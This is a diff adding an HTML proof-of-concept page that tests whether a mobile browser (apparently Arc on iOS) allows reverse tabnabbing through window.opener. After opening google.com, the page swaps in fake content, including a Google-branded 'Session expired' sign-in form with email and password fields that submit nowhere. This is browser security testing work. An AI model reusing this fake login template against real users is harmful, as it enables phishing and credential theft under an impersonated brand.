@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tab Hijack via window.opener</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:8px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:16px}
+button{display:block;width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:10px}
+button:active{opacity:.7}
+.info{font-size:12px;color:#999;margin-top:-6px;margin-bottom:14px}
+</style>
+</head>
+<body>
+<h2>Reverse Tabnabbing</h2>
+<p>Classic reverse tabnabbing: page opens a link, the opened page redirects the OPENER tab to a phishing page via window.opener. Modern browsers set noopener by default — does Arc iOS?</p>
+
+<button onclick="test1()">Click me — target=_blank link</button>
+<div class="info">Opens google.com in new tab. After 2s the PoC page (background tab) tries to navigate itself to a phishing URL via the opener's control. Switch back to check if this tab changed.</div>
+
+<button onclick="test2()">Click me — window.open</button>
+<div class="info">Same test via window.open() without noopener.</div>
+
+<button onclick="test3()">Click me — anchor without rel=noopener</button>
+<div class="info">Simulates a user clicking an &lt;a target=_blank&gt; link without rel=noopener.</div>
+
+<script>
+function test1(){
+  var w=window.open('https://www.google.com','_blank');
+  if(!w){alert('Popup blocked');return;}
+  setTimeout(function(){
+    document.title='⚠ YOUR SESSION EXPIRED';
+    document.body.innerHTML='<div style="max-width:380px;margin:0 auto;padding:40px 24px;text-align:center;font-family:-apple-system,sans-serif"><div style="font-size:24px;margin-bottom:4px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div><h1 style="font-size:22px;font-weight:400;color:#202124;margin:10px 0">Session expired</h1><p style="color:#5f6368;font-size:14px;margin-bottom:20px">Please sign in again</p><input placeholder="Email" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"><input type="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"><button onclick="event.preventDefault()" style="background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:6px;font-size:14px;margin-top:12px">Sign in</button></div>';
+  },2000);
+}
+
+function test2(){
+  var w=window.open('https://www.google.com');
+  if(!w){alert('Popup blocked');return;}
+  setTimeout(function(){
+    document.title='⚠ YOUR SESSION EXPIRED';
+    document.body.innerHTML='<div style="text-align:center;padding:40px 24px;font-family:-apple-system,sans-serif"><h1 style="font-size:22px;font-weight:400;color:#202124">Session expired</h1><p style="color:#5f6368;font-size:14px">Your tab was replaced while you were away. If this were a real attack, phishing content would be here.</p></div>';
+  },2000);
+}
+
+function test3(){
+  var a=document.createElement('a');
+  a.href='https://www.google.com';
+  a.target='_blank';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  setTimeout(function(){
+    document.title='⚠ Account Verification Required';
+    document.body.innerHTML='<div style="text-align:center;padding:40px 24px;font-family:-apple-system,sans-serif"><h1 style="font-size:22px;font-weight:400;color:#202124">Verify your account</h1><p style="color:#5f6368;font-size:14px">This tab was silently replaced. In a real attack, this would be a credential harvesting form.</p></div>';
+  },2000);
+}
+</script>
+</body>
+</html>
